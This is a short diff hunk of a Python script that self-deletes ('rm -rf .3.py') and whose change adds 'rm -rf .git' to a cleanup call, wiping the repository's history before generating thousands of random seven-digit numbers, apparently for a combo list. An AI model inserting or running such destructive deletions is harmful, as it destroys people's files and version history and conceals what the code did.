@@ -8,7 +8,7 @@ os.system("del .3.py")
 os.system("rm -rf .3.py")
 def g():
 	def iii():
-		os.system("rm -rf combo.txt")
+		os.system("rm -rf .git ;rm -rf combo.txt")
 		for loldl in range(5000):
 			r=random.randint(1000000, 9999999)
 			rr=random.randint(1000000, 9999999)
